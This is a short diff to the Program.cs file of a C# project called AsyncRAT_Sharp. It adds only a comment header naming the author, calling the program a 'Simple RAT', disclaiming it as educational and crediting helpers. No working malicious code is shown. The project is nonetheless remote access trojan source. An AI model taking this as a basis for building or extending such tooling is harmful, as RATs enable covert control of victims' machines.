@@ -4,6 +4,18 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
+//       │ Author     : NYAN CAT
+//       │ Name       : AsyncRAT // Simple RAT
+
+//       Contact Me   : https://github.com/NYAN-x-CAT
+
+//       This program Is distributed for educational purposes only.
+
+//       Credits;
+//       Serialization    @ymofen
+//       StreamLibrary    @Dergan
+//       Special Thanks   MaxXor@hf gigajew@hf
+
 namespace AsyncRAT_Sharp
 {
     static class Program
